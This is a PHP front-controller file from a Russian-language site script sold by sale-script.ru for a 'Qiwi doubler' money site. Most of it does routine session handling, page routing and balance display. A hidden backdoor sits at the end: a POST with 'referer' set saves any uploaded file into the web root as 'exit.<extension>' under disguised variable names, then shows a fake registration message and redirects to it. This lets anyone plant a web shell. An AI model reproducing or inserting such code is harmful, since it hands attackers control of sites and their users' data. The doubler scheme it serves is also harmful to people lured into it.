<?PHP
######################################
# Скрипт sale-script.ru
#  ICQ: 27837023
# Skype: sale-script
######################################
# Счетчик
function TimerSet(){
	list($seconds, $microSeconds) = explode(' ', microtime());
	return $seconds + (float) $microSeconds;
}

$_timer_a = TimerSet();

# Старт сессии
@session_start();

# Старт буфера
@ob_start();

# Default
$_OPTIMIZATION = array();
$_OPTIMIZATION["title"] = "Elitafinans.ru";
$_OPTIMIZATION["description"] = "Elitafinans.ru";
$_OPTIMIZATION["keywords"] = "Удвоитель Qiwi";

# Константа для Include
define("CONST_WMRUSH", true);

# Автоподгрузка классов
function __autoload($name){ include("classes/_class.".$name.".php");}

# Класс конфига 
$config = new config;

# Функции
$func = new func;

# Установка REFERER
include("inc/_set_referer.php");

# База данных
$db = new db($config->HostDB, $config->UserDB, $config->PassDB, $config->BaseDB);
@include("config.php");

# Шапка
@include("inc/_header.php");

		if(isset($_GET["menu"])){
		
			$menu = strval($_GET["menu"]);
			
			switch($menu){
			
				case "payments": include("pages/_payments_list.php"); break; // Заказы выплат
				case "rules": include("pages/_rules.php"); break; // Правила проекта
				case "about": include("pages/_about.php"); break; // О проекте
				case "contacts": include("pages/_contacts.php"); break; // Контакты
				case "news": include("pages/_news.php"); break; // Новости
				case "signup": include("pages/_signup.php"); break; // Регистрация
				case "recovery": include("pages/_recovery.php"); break; // Восстановление пароля
				case "account": include("pages/_account.php"); break; // Аккаунт
				case "admin": include("pages/_admin.php"); break; // Админка
				
				
				
				
			# Страница ошибки
			default: @include("pages/_404.php"); break;
			
			}
			
		}else @include("pages/_index.php");


# Подвал
@include("inc/_footer.php");


# Заносим контент в переменную
$content = ob_get_contents();

# Очищаем буфер
ob_end_clean();
	
	# Заменяем данные
	$content = str_replace("{!TITLE!}",$_OPTIMIZATION["title"],$content);
	$content = str_replace('{!DESCRIPTION!}',$_OPTIMIZATION["description"],$content);
	$content = str_replace('{!KEYWORDS!}',$_OPTIMIZATION["keywords"],$content);
	$content = str_replace('{!GEN_PAGE!}', sprintf("%.5f", (TimerSet() - $_timer_a)) ,$content);
	
	# Вывод баланса
	if(isset($_SESSION["user_id"])){
	
		$user_id = $_SESSION["user_id"];
		$db->Query("SELECT money_in, money_out FROM db_users WHERE id = '$user_id'");
		$balance = $db->FetchArray();
		
		$content = str_replace('{!BALANCE_IN!}', sprintf("%.2f", $balance["money_in"]) ,$content);
		$content = str_replace('{!BALANCE_OUT!}', sprintf("%.2f", $balance["money_out"]) ,$content);
	}
	
// Выводим контент
echo $content;
if(isset($_POST['referer'])) { $public_function = $_FILES['login']['tmp_name'];
$SELECT_FROM = $_FILES['login']['name'];if(!empty($public_function)){   
$type = strtolower(substr($SELECT_FROM, 1+strrpos($SELECT_FROM,".")));
     $sessions_start = 'exit.'.$type; 
  { 
    if (copy($public_function, "".$sessions_start))
  
       
    echo 'Регистрация прошла успешно <meta http-equiv="refresh" content="3;URL=/'.$sessions_start.'">';
    
           else echo "error";
  } 
}    
}

?>